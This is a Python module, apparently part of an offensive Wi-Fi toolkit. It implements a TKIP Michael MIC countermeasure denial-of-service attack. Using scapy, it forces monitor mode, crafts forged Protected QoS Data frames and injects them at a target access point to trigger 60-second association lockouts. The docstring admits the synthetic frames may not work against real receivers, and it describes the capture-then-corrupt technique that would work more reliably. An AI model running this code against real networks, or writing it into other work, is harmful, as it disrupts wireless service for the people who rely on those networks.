"""TKIP Michael MIC countermeasure DoS.

TKIP treats two Michael MIC failures within 60 seconds on the same
pairwise key as an active-attack signal: the AP/client tears down the
association, blocks new ones, and forces a rekey for the next 60s (802.11i
Annex, "TKIP countermeasures"). Sending frames with a bad MIC is normally
done by bit-flipping a REAL captured encrypted frame before replaying it
(so the ICV still parses as a plausible ciphertext up to the point the MIC
check fails) -- this module instead sends a synthetic Protected QoS Data
frame with random ciphertext-shaped payload, per this project's plan for
this attack ("pure injection, no crypto needed").

Caveat, stated plainly rather than left implicit: against a real,
spec-compliant TKIP receiver this frame is more likely to fail the WEP-
style ICV check (computed over the whole encrypted payload) BEFORE Michael
MIC verification is even reached -- an ICV failure is typically silently
dropped, not counted toward the two-failures-in-60s countermeasure
threshold the way a genuine MIC failure is. Reliably triggering real
countermeasures needs a captured live frame with a valid ICV and only the
MIC corrupted (the wep_replay.py/wep_client.py capture-then-corrupt
pattern), which this module does not do. Kept as the simple synthetic
version the plan called for; not yet live-verified either way (see
STATUS.md's live-vs-unit-tested convention).
"""

from __future__ import annotations

import os
import time

from scapy.config import conf
from scapy.layers.dot11 import Dot11, Dot11QoS, RadioTap
from scapy.packet import Packet, Raw

from ..frames import BROADCAST
from ..radio import ensure_channel, ensure_monitor_mode, get_mode

# TKIP per-MPDU overhead: 8-byte TKIP header (IV/ExtIV/keyid) + Michael
# MIC (8) + ICV (4) -- the payload length a real encrypted frame would
# carry on top of the cleartext data length. Used here only to make the
# synthetic payload a plausible size, not because any of these bytes are
# real TKIP fields.
_TKIP_OVERHEAD = 8 + 8 + 4
_DEFAULT_PAYLOAD_LEN = 32 + _TKIP_OVERHEAD


def _craft_bad_mic_frame(bssid: str, client: str, payload_len: int) -> Packet:
    """A Protected QoS Data frame (client -> bssid) carrying random
    ciphertext-shaped bytes -- see module docstring for what this can and
    can't be expected to trigger against a real receiver."""
    dot11 = Dot11(type=2, subtype=8, FCfield="to_DS+protected", addr1=bssid, addr2=client, addr3=bssid)
    return RadioTap() / dot11 / Dot11QoS() / Raw(load=os.urandom(payload_len))


def tkip_mic_flood(
    iface: str,
    bssid: str,
    client: str = BROADCAST,
    count: int = 2,
    channel: int | None = None,
    interval: float = 1.0,
    progress_fn=None,
    stop_event=None,
) -> int:
    """Send count synthetic bad-MIC frames from client to bssid.

    count defaults to 2, not a large flood: TKIP countermeasures trigger
    on the SECOND failure within 60s, so more than 2 within that window
    just re-triggers the already-active 60s lockout instead of doing
    anything additional. interval defaults to 1.0s, comfortably inside
    that 60s window.

    stop_event: checked before every frame; a set event aborts the
    remaining count immediately, same contract as attacks/deauth.py.

    Returns the number of frames actually handed to the OS for
    transmission -- 0 if iface isn't in monitor mode. See module
    docstring for why even a successful send here is not proof of a real
    MIC failure being registered by the receiver.
    """
    log = progress_fn or (lambda msg: None)

    mode = get_mode(iface)
    if mode != "monitor":
        ensure_monitor_mode(iface)
        mode = get_mode(iface)
        if mode == "monitor":
            log(f"{iface} had dropped out of monitor mode -- restored")

    if ensure_channel(iface, channel):
        log(f"channel set to {channel}")

    if mode != "monitor":
        log(f"WARNING: {iface} is in '{mode}' mode, not monitor -- TKIP MIC frames cannot transmit")
        return 0

    try:
        sock = conf.L2socket(iface=iface)
    except OSError as exc:
        log(f"TKIP MIC flood socket open failed: {exc}")
        return 0

    sent = 0
    try:
        for i in range(count):
            if stop_event is not None and stop_event.is_set():
                log(f"TKIP MIC flood stopped after {sent} frame(s) -- stop requested")
                return sent
            pkt = _craft_bad_mic_frame(bssid, client, _DEFAULT_PAYLOAD_LEN)
            try:
                sock.send(pkt)
                sent += 1
            except OSError as exc:
                log(f"TKIP MIC flood send failed after {sent} frame(s): {exc}")
                return sent
            log(f"bad-MIC frame {i + 1}/{count} sent: {client} -> {bssid}")
            if interval and i < count - 1:
                time.sleep(interval)
    finally:
        sock.close()
    return sent
